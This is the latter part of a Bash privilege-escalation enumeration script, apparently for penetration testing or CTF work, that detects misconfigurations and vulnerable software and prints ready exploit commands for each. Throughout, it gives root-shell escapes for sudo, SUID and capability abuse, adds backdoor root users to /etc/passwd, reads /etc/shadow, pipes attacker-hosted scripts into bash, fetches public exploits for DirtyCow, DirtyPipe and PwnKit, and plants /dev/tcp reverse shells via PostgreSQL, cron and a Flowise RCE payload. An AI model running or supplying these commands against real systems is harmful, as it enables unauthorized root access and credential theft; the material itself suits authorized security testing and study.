# ── P1: LXD/LXC group ─────────────────────────────────────────────────────
if id | grep -qE '\blxd\b|\blxc\b'; then
    exploit_entry "P1" "Member of lxd/lxc group" \
"  Build Alpine image on attacker box, transfer, then:
  \$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
  \$ lxc init alpine privesc -c security.privileged=true
  \$ lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
  \$ lxc start privesc && lxc exec privesc /bin/sh
  Inside container: chroot /mnt/root"
fi

# ── P1: disk group ────────────────────────────────────────────────────────
if id | grep -qE '\bdisk\b'; then
    exploit_entry "P1" "Member of disk group" \
"  Direct block device access — read /etc/shadow via debugfs:
  \$ df -h /   # find the device e.g. /dev/sda1
  \$ debugfs /dev/sda1
  debugfs: cat /etc/shadow"
fi

# ── P1/P2: sudo NOPASSWD ──────────────────────────────────────────────────
if echo "$sudo_result" | grep -qi 'NOPASSWD'; then
    if echo "$sudo_result" | grep -qiE 'NOPASSWD.*\(ALL.*\).*ALL|ALL.*NOPASSWD.*ALL'; then
        exploit_entry "P1" "sudo NOPASSWD: ALL" \
"  \$ sudo bash
  Or: \$ sudo su -"
    fi
    for bin in bash sh zsh ksh dash python python3 python2 perl ruby node \
               vim vi nano emacs less more awk gawk nawk sed find env \
               cp mv tee dd wget curl git nmap tar zip xxd; do
        if echo "$sudo_result" | grep -qiE "NOPASSWD.*[/ ]${bin}[0-9._-]*( |\$)"; then
            case "$bin" in
                bash|sh|zsh|ksh|dash)
                    exploit_entry "P1" "sudo NOPASSWD: $bin" \
"  \$ sudo $bin" ;;
                python|python3|python2)
                    exploit_entry "P1" "sudo NOPASSWD: $bin" \
"  \$ sudo $bin -c 'import os; os.system(\"/bin/bash\")'
  Or interactive: sudo $bin -c 'import pty; pty.spawn(\"/bin/bash\")'" ;;
                perl)
                    exploit_entry "P1" "sudo NOPASSWD: perl" \
"  \$ sudo perl -e 'exec \"/bin/bash\";'" ;;
                ruby)
                    exploit_entry "P1" "sudo NOPASSWD: ruby" \
"  \$ sudo ruby -e 'exec \"/bin/bash\"'" ;;
                vim|vi|rvim)
                    exploit_entry "P1" "sudo NOPASSWD: $bin" \
"  \$ sudo $bin -c ':!/bin/bash'
  Or from inside: :set shell=/bin/bash | :shell" ;;
                nano)
                    exploit_entry "P1" "sudo NOPASSWD: nano" \
"  \$ sudo nano /etc/passwd  → add: r00t:\$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash
  Or shell escape: Ctrl+R Ctrl+X → reset; bash 1>&0 2>&0" ;;
                less|more)
                    exploit_entry "P1" "sudo NOPASSWD: $bin" \
"  \$ sudo $bin /etc/passwd
  From pager prompt: !/bin/bash" ;;
                awk|gawk|nawk)
                    exploit_entry "P1" "sudo NOPASSWD: $bin" \
"  \$ sudo $bin 'BEGIN {system(\"/bin/bash\")}'" ;;
                find)
                    exploit_entry "P1" "sudo NOPASSWD: find" \
"  \$ sudo find / -exec /bin/bash \; -quit" ;;
                env)
                    exploit_entry "P1" "sudo NOPASSWD: env" \
"  \$ sudo env /bin/bash" ;;
                tee)
                    exploit_entry "P1" "sudo NOPASSWD: tee" \
"  \$ echo 'r00t:\$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
  \$ su r00t" ;;
                tar)
                    exploit_entry "P1" "sudo NOPASSWD: tar" \
"  \$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash" ;;
                git)
                    exploit_entry "P1" "sudo NOPASSWD: git" \
"  \$ sudo git -p help config
  From pager: !/bin/bash" ;;
                nmap)
                    exploit_entry "P1" "sudo NOPASSWD: nmap" \
"  Old nmap (2.02-5.21): sudo nmap --interactive → nmap> !bash
  New nmap:
  \$ echo 'os.execute(\"/bin/bash\")' > /tmp/s.nse && sudo nmap --script=/tmp/s.nse" ;;
                cp)
                    exploit_entry "P2" "sudo NOPASSWD: cp" \
"  Overwrite /etc/passwd with a modified version:
  \$ cp /etc/passwd /tmp/p && echo 'r00t:\$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /tmp/p
  \$ sudo cp /tmp/p /etc/passwd && su r00t" ;;
                dd)
                    exploit_entry "P2" "sudo NOPASSWD: dd" \
"  Append a root user to /etc/passwd:
  \$ echo 'r00t:\$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' > /tmp/line
  \$ sudo dd if=/tmp/line of=/etc/passwd oflag=append conv=notrunc" ;;
                wget)
                    exploit_entry "P2" "sudo NOPASSWD: wget" \
"  Overwrite a sensitive file from your server:
  \$ sudo wget http://<attacker>/evil_sudoers -O /etc/sudoers" ;;
                curl)
                    exploit_entry "P2" "sudo NOPASSWD: curl" \
"  \$ sudo curl http://<attacker>/shell.sh | bash
  Or overwrite: sudo curl http://<attacker>/evil -o /etc/sudoers" ;;
                xxd)
                    exploit_entry "P2" "sudo NOPASSWD: xxd" \
"  Read any file:
  \$ sudo xxd /etc/shadow | xxd -r" ;;
                *)
                    exploit_entry "P2" "sudo NOPASSWD: $bin" \
"  Check: https://gtfobins.github.io/gtfobins/${bin}/#sudo" ;;
            esac
        fi
    done
fi

# ── P1: SUID GTFOBins ─────────────────────────────────────────────────────
if [ -n "$suid_hits_full" ]; then
    while IFS= read -r fullpath; do
        [ -z "$fullpath" ] && continue
        bin=$(basename "$fullpath")
        case "$bin" in
            bash*)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath -p   (-p preserves effective UID, skips privilege drop)" ;;
            find)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath . -exec /bin/bash -p \; -quit" ;;
            python*|python)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'" ;;
            perl*)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'" ;;
            vim*|vi)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath -c ':py import os; os.execl(\"/bin/bash\",\"bash\",\"-pc\",\"reset; exec bash -p\")'
  Or simpler: $fullpath -c ':!/bin/bash -p'" ;;
            awk|gawk|nawk|mawk)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath 'BEGIN {system(\"/bin/bash -p\")}'" ;;
            env)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath /bin/bash -p" ;;
            tar)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='bash -p'" ;;
            less|more)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath /etc/passwd
  From pager: !/bin/bash -p" ;;
            nano)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ $fullpath
  Ctrl+R Ctrl+X → reset; bash -p 1>&0 2>&0" ;;
            nmap)
                exploit_entry "P1" "SUID: $fullpath" \
"  \$ echo 'os.execute(\"/bin/bash -p\")' > /tmp/s.nse && $fullpath --script=/tmp/s.nse" ;;
            pkexec)
                exploit_entry "P1" "SUID: $fullpath (CVE-2021-4034 PwnKit)" \
"  \$ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
  \$ chmod +x PwnKit && ./PwnKit
  Alt: https://github.com/berdav/CVE-2021-4034" ;;
            screen)
                exploit_entry "P1" "SUID: $fullpath (screen-4.5.0 local root)" \
"  Exploit: https://www.exploit-db.com/exploits/41154
  \$ wget https://www.exploit-db.com/raw/41154 -O screen_exploit.sh
  \$ bash screen_exploit.sh" ;;
            cp)
                exploit_entry "P2" "SUID: $fullpath" \
"  Copy /etc/shadow to a readable location:
  \$ $fullpath /etc/shadow /tmp/shadow_copy && cat /tmp/shadow_copy
  Or overwrite /etc/passwd with a crafted version." ;;
            *)
                exploit_entry "P2" "SUID: $fullpath" \
"  Check: https://gtfobins.github.io/gtfobins/${bin}/#suid" ;;
        esac
    done <<< "$suid_hits_full"
fi

# ── P1: Dangerous capabilities ────────────────────────────────────────────
if [ -n "$dangerous_caps" ]; then
    while IFS= read -r capline; do
        [ -z "$capline" ] && continue
        capbin=$(echo "$capline" | awk '{print $1}')
        capbinname=$(basename "$capbin")
        capname=$(echo "$capline" | grep -oE 'cap_[a-z_]+' | head -1)
        case "$capname" in
            cap_setuid)
                case "$capbinname" in
                    python*)
                        setuid_cmd="  \$ $capbin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'" ;;
                    perl*)
                        setuid_cmd="  \$ $capbin -e 'use POSIX; POSIX::setuid(0); exec \"/bin/bash\";'" ;;
                    ruby*)
                        setuid_cmd="  \$ $capbin -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'" ;;
                    node*|nodejs*)
                        setuid_cmd="  \$ $capbin -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'" ;;
                    *)
                        setuid_cmd="  Binary: $capbin — research cap_setuid exploit for: $capbinname
  Ref: https://gtfobins.github.io/gtfobins/$capbinname/" ;;
                esac
                exploit_entry "P1" "Capability cap_setuid on: $capbin" "$setuid_cmd" ;;
            cap_setgid)
                case "$capbinname" in
                    python*)
                        setgid_cmd="  \$ $capbin -c 'import os; os.setgid(0); os.system(\"/bin/bash\")'" ;;
                    perl*)
                        setgid_cmd="  \$ $capbin -e 'use POSIX; POSIX::setgid(0); exec \"/bin/bash\";'" ;;
                    *)
                        setgid_cmd="  Binary: $capbin — research cap_setgid exploit for: $capbinname" ;;
                esac
                exploit_entry "P1" "Capability cap_setgid on: $capbin" "$setgid_cmd" ;;
            cap_dac_override)
                exploit_entry "P1" "Capability cap_dac_override on: $capbin" \
"  Bypass all file permission checks — read /etc/shadow:
  \$ $capbin /etc/shadow   (if $capbinname is a file reader e.g. vim, tee, cat)
  Or write: echo 'r00t:\$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' | $capbin -a /etc/passwd" ;;
            cap_sys_admin)
                exploit_entry "P1" "Capability cap_sys_admin on: $capbin" \
"  Near-root — can mount filesystems, modify kernel params, bypass namespaces.
  Research the specific exploit path for: $capbinname + cap_sys_admin" ;;
            cap_sys_ptrace)
                exploit_entry "P2" "Capability cap_sys_ptrace on: $capbin" \
"  Attach to a root-owned process and inject a command:
  1. \$ ps aux | grep root   # pick a PID
  2. \$ gdb -p <PID>
  gdb> call (void)system(\"chmod +s /bin/bash\")
  gdb> quit
  \$ /bin/bash -p" ;;
            cap_fowner)
                exploit_entry "P2" "Capability cap_fowner on: $capbin" \
"  Bypass ownership — SUID bash:
  \$ $capbin +s /bin/bash && /bin/bash -p" ;;
            cap_net_raw)
                exploit_entry "P3" "Capability cap_net_raw on: $capbin" \
"  Sniff cleartext credentials:
  \$ tcpdump -i any -A 'port 80 or port 21 or port 23 or port 110'" ;;
        esac
    done <<< "$dangerous_caps"
fi

# ── P1: PostgreSQL superuser — COPY TO PROGRAM (RCE) ─────────────────────
if [ -n "$pg_result" ] && [ "$pg_superuser" = "on" ]; then
    exploit_entry "P1" "PostgreSQL superuser access — COPY TO PROGRAM RCE" \
"  Execute OS commands as the postgres user:
  \$ psql -U postgres -c \"COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1';\"
  Or add SUID to bash:
  \$ psql -U postgres -c \"COPY (SELECT '') TO PROGRAM 'chmod +s /bin/bash';\"
  \$ /bin/bash -p
  Dump hashes for offline cracking:
  \$ psql -U postgres -c 'SELECT usename,passwd FROM pg_shadow;'"
fi

# ── P2: PostgreSQL no-auth access (non-superuser) ─────────────────────────
if [ -n "$pg_result" ] && [ "$pg_superuser" != "on" ]; then
    exploit_entry "P2" "PostgreSQL access as 'postgres' (non-superuser)" \
"  Enumerate data and escalate:
  \$ psql -U postgres -c '\l'           # list databases
  \$ psql -U postgres -c '\du'          # list roles
  \$ psql -U postgres -d <db> -c '\dt'  # list tables
  Check for SECURITY DEFINER functions that may allow privesc:
  \$ psql -U postgres -c \"SELECT proname,prosecdef FROM pg_proc WHERE prosecdef='t';\""
fi

# ── P2: NFS no_root_squash ────────────────────────────────────────────────
if [ -n "$nfs_squash" ]; then
    nfs_share=$(echo "$nfs_squash" | awk '{print $1}' | head -1)
    exploit_entry "P2" "NFS share with no_root_squash: $nfs_share" \
"  On attacker box (as root):
  # mkdir /tmp/nfsmount
  # mount -t nfs <target_ip>:${nfs_share} /tmp/nfsmount
  # cp /bin/bash /tmp/nfsmount/rootbash && chmod +xs /tmp/nfsmount/rootbash
  Back on target:
  \$ ${nfs_share}/rootbash -p"
fi

# ── P2: Writable cron scripts ─────────────────────────────────────────────
if [ -n "$writable_crons_found" ]; then
    exploit_entry "P2" "Writable cron script(s)" \
"  Inject a payload — waits for next scheduled execution:
  \$ echo 'chmod +s /bin/bash' >> <writable_cron_script>
  After cron runs: /bin/bash -p
  Or reverse shell: echo 'bash -i >& /dev/tcp/<attacker>/<port> 0>&1' >> <script>
  Writable files:
$(echo "$writable_crons_found" | sed 's/^/  → /')"
fi

# ── P2: Writable systemd service ──────────────────────────────────────────
if [ -n "$writable_services" ]; then
    exploit_entry "P2" "Writable systemd service file(s)" \
"  Edit ExecStart in the service file to run your payload as root:
  ExecStart=/bin/bash -c 'chmod +s /bin/bash'
  Then: sudo systemctl restart <service> (or wait for restart)
  Then: /bin/bash -p
  Writable services:
$(echo "$writable_services" | sed 's/^/  → /')"
fi

# ── P2: /var/backups credential files ─────────────────────────────────────
for bakfile in /var/backups/shadow.bak /var/backups/passwd.bak; do
    if [ -r "$bakfile" ]; then
        exploit_entry "P2" "Readable backup credential file: $bakfile" \
"  \$ cat $bakfile
  Crack with: john $bakfile --wordlist=/usr/share/wordlists/rockyou.txt
  Or: hashcat -m 1800 $bakfile /usr/share/wordlists/rockyou.txt"
    fi
done

# ── P2: Baron Samedit ─────────────────────────────────────────────────────
if [ "$is_baron_vulnerable" -eq 1 ]; then
    exploit_entry "P2" "Sudo $sudo_ver — CVE-2021-3156 (Baron Samedit, < 1.9.5p2)" \
"  Local root regardless of sudoers config:
  \$ git clone https://github.com/blasty/CVE-2021-3156 && cd CVE-2021-3156 && make
  \$ ./sudo-hax-me-a-sandwich
  Alt: https://github.com/worawit/CVE-2021-3156"
fi

# ── P1: DirtyCow ──────────────────────────────────────────────────────────
if [ "$is_dirtycow" -eq 1 ]; then
    exploit_entry "P1" "Kernel $kernel_ver — CVE-2016-5195 (DirtyCow)" \
"  Local root via copy-on-write race in mm subsystem (kernel < 4.8.3):
  \$ wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
  \$ gcc -pthread dirty.c -o dirty -lcrypt
  \$ ./dirty <new_password>   # adds firefart:<pw>:0:0 to /etc/passwd
  \$ su firefart"
fi

# ── P1: DirtyPipe ─────────────────────────────────────────────────────────
if [ "$is_dirtypipe" -eq 1 ]; then
    exploit_entry "P1" "Kernel $kernel_ver — CVE-2022-0847 (DirtyPipe)" \
"  Overwrite read-only files via pipe splice (kernel 5.8 - 5.16.11):
  \$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
  \$ cd CVE-2022-0847-DirtyPipe-Exploits && ./compile.sh
  \$ ./exploit-1   # SUID hijack — gives root shell"
fi

# ── P1: Writable MOTD ─────────────────────────────────────────────────────
if [ -n "$writable_motd" ]; then
    exploit_entry "P1" "Writable MOTD script(s) in /etc/update-motd.d/" \
"  Inject a payload — runs as root on next SSH login:
  \$ echo 'chmod +s /bin/bash' >> <writable_motd_script>
  Then trigger by SSH'ing in (or wait for any user to login).
  After: /bin/bash -p
  Writable scripts:
$(echo "$writable_motd" | sed 's/^/  → /')"
fi

# ── P3: Writable PATH directory ───────────────────────────────────────────
if [ -n "$writable_path_dirs" ]; then
    exploit_entry "P3" "Writable directory in \$PATH — PATH hijack" \
"  If a root-owned script or cron calls a binary by name (not full path):
  \$ echo '/bin/bash -p' > <writable_path_dir>/<binary_name>
  \$ chmod +x <writable_path_dir>/<binary_name>
  Trigger the script/cron that calls it. Writable dirs:${writable_path_dirs}"
fi

# ── P3: Writable LD config ────────────────────────────────────────────────
if [ -w /etc/ld.so.conf ] || [ -n "$(find /etc/ld.so.conf.d/ -writable -type f 2>/dev/null)" ]; then
    exploit_entry "P3" "Writable LD library config — shared library hijack" \
"  1. Write a malicious .so to /tmp/evil_lib/:
     gcc -fPIC -shared -o /tmp/evil_lib/libfake.so evil.c -nostartfiles
  2. \$ echo '/tmp/evil_lib' > /etc/ld.so.conf.d/evil.conf && ldconfig
  Next time a privileged binary loads that library name, your code runs."
fi

# ── P1/P2: Third-party application CVEs ───────────────────────────────────
if printf '%b' "$thirdparty_vulns" | grep -q "GOGS_RCE_2024"; then
    gogs_v=$(printf '%b' "$thirdparty_vulns" | grep "GOGS_RCE_2024" | cut -d: -f2 | head -1)
    exploit_entry "P1" "Gogs $gogs_v — CVE-2024-39930/31/32/33 (multiple RCE < 0.13.0)" \
"  Chained: argument injection in git fetch + SSRF + auth bypass → unauthenticated RCE.
  \$ searchsploit gogs
  PoC: https://github.com/search?q=CVE-2024-39930&type=repositories
  Also check writable git hooks in /opt/gogs/repositories/ for authenticated path."
fi

if printf '%b' "$thirdparty_vulns" | grep -q "JENKINS_CVE_2024_23897"; then
    jenkins_v=$(printf '%b' "$thirdparty_vulns" | grep "JENKINS_CVE_2024_23897" | cut -d: -f2 | head -1)
    exploit_entry "P1" "Jenkins $jenkins_v — CVE-2024-23897: Unauthenticated file read via CLI" \
"  Read arbitrary files including secrets/master.key:
  \$ curl -s http://localhost:8080/jnlpJars/jenkins-cli.jar -o /tmp/jenkins-cli.jar
  \$ java -jar /tmp/jenkins-cli.jar -s http://localhost:8080/ who-am-i '@/etc/passwd'
  \$ java -jar /tmp/jenkins-cli.jar -s http://localhost:8080/ who-am-i '@/var/lib/jenkins/secrets/master.key'
  Decrypt stored creds: https://github.com/hoto/jenkins-credentials-decryptor
  PoC: https://github.com/CKevens/CVE-2024-23897"
fi

if printf '%b' "$thirdparty_vulns" | grep -q "GRAFANA_PATH_TRAV"; then
    grafana_v=$(printf '%b' "$thirdparty_vulns" | grep "GRAFANA_PATH_TRAV" | cut -d: -f2 | head -1)
    exploit_entry "P1" "Grafana $grafana_v — CVE-2021-43798: Unauthenticated path traversal" \
"  Read any file via plugin endpoint (no auth):
  \$ curl -s 'http://localhost:3000/public/plugins/alertlist/../../../../../../../../../etc/passwd'
  Read Grafana admin creds:
  \$ curl -s 'http://localhost:3000/public/plugins/alertlist/../../../../../../../../../etc/grafana/grafana.ini'
  PoC: https://github.com/jas502n/Grafana-CVE-2021-43798"
fi

if printf '%b' "$thirdparty_vulns" | grep -q "MINIO_INFO_LEAK"; then
    exploit_entry "P2" "MinIO — CVE-2023-28432: Unauthenticated env var disclosure" \
"  POST to health endpoint leaks MINIO_ROOT_USER and MINIO_ROOT_PASSWORD:
  \$ curl -s -X POST http://localhost:9000/minio/health/cluster?verify
  Use returned creds to access MinIO console or pivot to other services."
fi

if printf '%b' "$thirdparty_vulns" | grep -q "NEXTCLOUD_AUTH_BYPASS"; then
    nc_v=$(printf '%b' "$thirdparty_vulns" | grep "NEXTCLOUD_AUTH_BYPASS" | cut -d: -f2 | head -1)
    exploit_entry "P2" "Nextcloud $nc_v — CVE-2023-48239: Auth bypass" \
"  Auth bypass in share link handling — check Nextcloud security advisories:
  https://nextcloud.com/security/advisories/
  Also enumerate: /nextcloud/config/config.php for DB credentials (may allow lateral move)
  \$ curl -s http://target/nextcloud/status.php   # confirm version"
fi

if printf '%b' "$thirdparty_vulns" | grep -q "PORTAINER_PATH_TRAV"; then
    pt_v=$(printf '%b' "$thirdparty_vulns" | grep "PORTAINER_PATH_TRAV" | cut -d: -f2 | head -1)
    exploit_entry "P2" "Portainer $pt_v — CVE-2022-26960: Path traversal" \
"  Read arbitrary host files via Portainer's file browser (authenticated):
  GET /api/endpoints/1/docker/volumes/<vol>/browse?path=../../../../etc/shadow
  Also check /data/portainer.db — contains bcrypt-hashed admin password:
  \$ sqlite3 /data/portainer.db 'SELECT Username,Password FROM user;'
  Crack: hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt"
fi

if printf '%b' "$thirdparty_vulns" | grep -q "FLOWISE_RCE"; then
    flowise_v=$(printf '%b' "$thirdparty_vulns" | grep "FLOWISE_RCE" | cut -d: -f2 | head -1)
    exploit_entry "P1" "Flowise $flowise_v — CVE-2025-59528: Authenticated RCE via CustomMCP node" \
"  Step 1 — get token (CVE-2025-58434 unauthenticated reset leak if needed):
  \$ curl -X POST http://target/api/v1/account/forgot-password -H 'Content-Type: application/json' -d '{\"email\":\"admin@target\"}'
  Token returned in response — use /api/v1/account/reset-password to set new password.
  Step 2 — RCE with valid API key:
  \$ curl -X POST http://target/api/v1/node-load-method/customMCP \\
    -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' \\
    -d '{\"inputs\":{\"mcpServerConfig\":\"({x:(function(){const cp=process.mainModule.require(\\\"child_process\\\");cp.exec(\\\"bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\\");return 1;})()})\"}}'"
fi

# ── Finalise — count entries directly from the file ───────────────────────
exploit_count=$(grep -c '^\[P' "$exploit" 2>/dev/null || echo 0)
{
echo "======================================================================"
echo "  Total exploit paths identified: ${exploit_count}"
echo "======================================================================"
} >> "$exploit"

if [ "$exploit_count" -gt 0 ]; then
    echo -e "\n${GRN}    [✓] Saved → ${WHT}$exploit${RST}"
else
    echo "  [—] No automated exploit paths matched. Review findings manually." >> "$exploit"
    echo -e "\n    ${YLW}[—] No automated exploit paths matched — review manually${RST}"
fi
echo ""

# ============================================================================
#  SUMMARY
# ============================================================================
end_time=$(date +%s)
elapsed=$((end_time - start_time))

# Finalise findings file
findings_count=$(grep -c '^\[!!\]' "$findings" 2>/dev/null || echo 0)
echo "" >> "$findings"
echo "======================================================================" >> "$findings"
echo "  Total findings: ${findings_count}" >> "$findings"
echo "======================================================================" >> "$findings"

echo -e "${CYN}═══════════════════════════════════════════════════════════════════════${RST}"
echo -e "${CYN}  SCAN COMPLETE${RST}"
echo -e "${CYN}═══════════════════════════════════════════════════════════════════════${RST}"
echo ""
echo -e "  ${WHT}Duration  :${RST} ${elapsed}s"
echo -e "  ${WHT}Output Dir:${RST} $(pwd)/$main"
echo ""

if [ "$findings_count" -gt 0 ]; then
    echo -e "  ${RED}╔══════════════════════════════════════════════════════════════════╗${RST}"
    echo -e "  ${RED}║  [!!] ${findings_count} FINDING(S) DETECTED — review 00-FINDINGS.txt           ║${RST}"
    echo -e "  ${RED}╚══════════════════════════════════════════════════════════════════╝${RST}"
    echo ""
    echo -e "  ${RED}Findings Preview:${RST}"
    echo -e "  ─────────────────────────────────────────"
    grep '^\[!!\]' "$findings" | while read -r line; do
        echo -e "    ${RED}${line}${RST}"
    done
    echo ""
else
    echo -e "  ${GRN}[✓] No critical findings detected.${RST}"
    echo ""
fi

echo -e "  ${GRN}Files Generated:${RST}"
echo -e "  ─────────────────────────────────────────"

for f in "$findings" "$exploit" "$sys" "$ugo" "$pswd" "$shdw" "$svc" "$cronned" "$path_info" \
         "$netstuff" "$suid" "$keys" "$sql" "$logs" "$fs" "$history" "$devtools" "$thirdparty"; do
    if [ -f "$f" ]; then
        size=$(du -h "$f" 2>/dev/null | cut -f1)
        echo -e "    ${GRN}✓${RST} ${f##*/}  ${YLW}(${size})${RST}"
    fi
done

echo ""
echo -e "  ${YLW}Tip: cat $findings${RST}"
echo -e "  ${YLW}Tip: cat $exploit${RST}"
echo -e "  ${YLW}Tip: grep -ri 'password\\|pass\\|root\\|FINDING' $main/${RST}"
echo -e "  ${YLW}Tip: Review SUID-GUID.txt against https://gtfobins.github.io${RST}"
echo ""
echo -e "${CYN}═══════════════════════════════════════════════════════════════════════${RST}"
